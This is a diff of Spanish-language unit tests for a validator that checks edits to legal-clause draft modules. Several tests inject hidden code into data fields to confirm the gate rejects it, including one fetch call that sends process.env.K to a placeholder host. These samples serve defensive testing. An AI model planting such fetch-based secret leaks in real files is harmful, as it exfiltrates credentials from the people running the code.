@@ -52,6 +52,25 @@ describe("compuertas de un borrador", () => {
     expect(checkReplacement(clause(ORIGINAL), `${ORIGINAL}, {}`)).not.toEqual([]);
   });
 
+  it("revisión C1: código escondido fuera de «text» se rechaza (claim, clave repetida, varias declaraciones)", () => {
+    const evilClaim = ORIGINAL.replace('art: "7" }', 'art: "7", claim: (fetch("https://x/?k=" + process.env.K), "texto") }');
+    expect(checkReplacement(clause(ORIGINAL), evilClaim)).not.toEqual([]);
+    const okClaim = ORIGINAL.replace('art: "7" }', 'art: "7", claim: "políticas de privacidad" }');
+    expect(checkReplacement(clause(ORIGINAL), okClaim)).toEqual([]);
+    const dupId = ORIGINAL.replace('id: "demo.uno",', 'id: (globalThis.x = 1, "demo.uno"),\n      id: "demo.uno",');
+    expect(checkReplacement(clause(ORIGINAL), dupId).join(" ")).toMatch(/repetid/);
+    expect(checkReplacement(clause(ORIGINAL), `${ORIGINAL}), y = (fetch("https://x")`)).not.toEqual([]);
+  });
+
+  it("revisión I8: un literal en posición de código dentro de «text» no puede cambiar", () => {
+    const withCode = ORIGINAL.replace(
+      "text: ({ company }) => `Hola ${company.name}. Publica tu política.`,",
+      'text: ({ company }) => (company.flags.includes("cctv") ? "Con cámaras." : "Sin cámaras."),'
+    );
+    expect(checkReplacement(clause(withCode), withCode.replace("Con cámaras.", "Si tienes cámaras."))).toEqual([]);
+    expect(checkReplacement(clause(withCode), withCode.replace('includes("cctv")', 'includes("todo")')).join(" ")).toMatch(/código/);
+  });
+
   it("una cita a un artículo que no existe se rechaza", () => {
     const next = ORIGINAL.replace('art: "7"', 'art: "999"');
     expect(checkReplacement(clause(ORIGINAL), next).join(" ")).toMatch(/999/);
@@ -62,6 +81,16 @@ describe("compuertas de un borrador", () => {
     expect(checkReplacement(span, span.source)).toEqual([]);
     expect(checkReplacement(span, span.source.replace("se almacenan por un plazo", "se guardan por un plazo")).join(" ")).toMatch(/frase/);
     expect(checkReplacement(span, span.source.replace('value: "30-60"', 'value: "30-90"')).join(" ")).toMatch(/valor/);
+  });
+
+  it("revisión C1/I7: un hecho no puede llevar código en note ni cambiar validFrom, y su frase debe decir la unidad", () => {
+    const span = locateTarget("cctv.conservacion")!;
+    const withNote = span.source.replace('quote: "', 'note: (fetch("https://x"), "nota"),\n    quote: "');
+    expect(checkReplacement(span, withNote)).not.toEqual([]);
+    const uit = locateTarget("uit.2026")!;
+    expect(checkReplacement(uit, uit.source.replace('validFrom: "2026-01-01"', 'validFrom: "2020-01-01"')).join(" ")).toMatch(/validFrom/);
+    const short = span.source.replace(/quote: "[^"]*"/, 'quote: "treinta (30) y sesenta (60)"');
+    expect(checkReplacement(span, short).join(" ")).toMatch(/frase/);
   });
 
   it("un texto de módulo: sin código nuevo y con citas que existen", () => {
